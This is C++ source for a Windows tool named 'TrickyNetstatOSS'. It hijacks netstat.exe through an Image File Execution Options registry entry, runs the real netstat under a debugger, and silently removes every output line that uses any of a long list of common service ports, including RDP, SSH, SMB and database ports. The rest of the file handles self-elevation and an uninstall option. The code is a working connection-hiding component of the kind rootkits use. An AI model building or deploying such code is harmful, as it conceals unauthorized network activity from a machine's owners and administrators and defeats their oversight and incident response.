#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <set>
#include <regex>

const std::set<int> FILTER_PORTS = {
    5353,135,21,22,23,69,110,111,137,138,139,143,161,389,427,443,445,
    502,554,587,636,873,1080,1099,1433,1521,1883,2049,2123,2152,2181,
    2222,2375,2379,2888,3000,3128,3306,3386,3389,3690,3888,4000,4040,
    4369,4440,4848,4899,5000,5005,5037,5432,5601,5631,5632,5673,5900,
    5984,6123,6379,7001,7051,7077,7180,7182,7848,8000,8009,8019,8020,
    8042,8048,8051,8069,8080,8081,8083,8086,8088,8123,8161,8443,8649,
    8848,8880,8883,8888,8999,9000,9001,9004,9042,9043,9083,9092,9100,
    9200,9300,9876,9990,10000,10909,10911,11000,11111,11211,11434,
    18080,19888,20880,25000,25010,27017,27018,50000,50030,50070,
    50090,60000,60010,60030,61616
};

// 提取端口（支持 IPv4 / IPv6）
bool extract_port(const std::string& line, int& port) {
    static const std::regex re(R"((\d+\.\d+\.\d+\.\d+|\[.*?\]):(\d+))");

    std::smatch match;
    if (std::regex_search(line, match, re)) {
        port = std::stoi(match[2]);
        return true;
    }
    return false;
}

bool keep(const std::string& line) {
    int port;

    if (extract_port(line, port)) {
        if (FILTER_PORTS.contains(port)) {
            return false;
        }
    }

    return true;
}

void RemoveIFEOFull() {
    std::wcout << L"[*] Deleting IFEO netstat key..." << std::endl;

    const std::wstring subkey =
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\netstat.exe";

    LONG result = RegDeleteKeyW(
        HKEY_LOCAL_MACHINE,
        subkey.c_str()
    );

    if (result != ERROR_SUCCESS) {
        std::wcerr << L"[-] RegDeleteKey failed: " << result << std::endl;
        return;
    }

    std::wcout << L"[+] IFEO key deleted." << std::endl;
}
bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &adminGroup))
    {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }

    return isAdmin;
}

// 自提权
void RelaunchAsAdmin() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    ShellExecuteA(
        NULL,
        "runas",          // 提权
        path,             // ✅ 程序路径
        "-u",             // ✅ 参数
        NULL,
        SW_SHOWNORMAL
    );
}
int main(int argc, char* argv[]) {
    if (argc < 2) return 1;

    // ===== 构造命令 =====
    std::string cmd;
    for (int i = 1; i < argc; i++) {
        cmd += argv[i];
        if (i != argc - 1) cmd += " ";
        std::string arg = argv[i];
        if (arg == "-u" or arg == "-U") {
            if (!IsRunAsAdmin()) {
                std::cout << "[*] You should use ADMIN to unistall TrickyNetstatOSS!" << std::endl;
                RelaunchAsAdmin();
                std::cout << "[?] next step will run in a new window." << std::endl;
                return 0;
            }

            RemoveIFEOFull();
            std::cout << "[*] TrickyNetstatOSS is unlink, but file still in C:/Windows/netpatch.exe, you can delete it." << std::endl;
            system("pause");
            return 0;
        }
    }

    // ===== 创建管道 =====
    HANDLE r, w;
    SECURITY_ATTRIBUTES sa{ sizeof(sa), NULL, TRUE };
    CreatePipe(&r, &w, &sa, 0);
    SetHandleInformation(r, HANDLE_FLAG_INHERIT, 0);

    // ===== 启动 netstat（调试模式）=====
    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = w;
    si.hStdError = w;

    std::vector<char> buf(cmd.begin(), cmd.end());
    buf.push_back('\0');

    if (!CreateProcessA(
        NULL, buf.data(),
        NULL, NULL, TRUE,
        DEBUG_ONLY_THIS_PROCESS,  // ✅ 保留调试模式
        NULL, NULL,
        &si, &pi)) {
        return 1;
    }

    CloseHandle(w);

    // ===== 新建 cmd 窗口 =====
    AllocConsole();
    FILE* fp;
    freopen_s(&fp, "CONOUT$", "w", stdout);

    // ===== 调试循环 + 输出处理 =====
    DEBUG_EVENT ev;
    char buffer[4096];
    DWORD read;

    std::string pending;

    while (true) {
        // 非阻塞读输出
        while (PeekNamedPipe(r, NULL, 0, NULL, &read, NULL) && read > 0) {
            ReadFile(r, buffer, sizeof(buffer), &read, NULL);
            pending.append(buffer, read);

            size_t pos;
            while ((pos = pending.find('\n')) != std::string::npos) {
                std::string line = pending.substr(0, pos);

                if (!line.empty() && line.back() == '\r')
                    line.pop_back();

                if (keep(line)) {
                    std::cout << line << "\n";
                }

                pending.erase(0, pos + 1);
            }
        }

        if (!WaitForDebugEvent(&ev, 50))
            continue;

        if (ev.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {
            ContinueDebugEvent(ev.dwProcessId, ev.dwThreadId, DBG_CONTINUE);
            break;
        }

        ContinueDebugEvent(ev.dwProcessId, ev.dwThreadId, DBG_CONTINUE);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(r);

    return 0;
}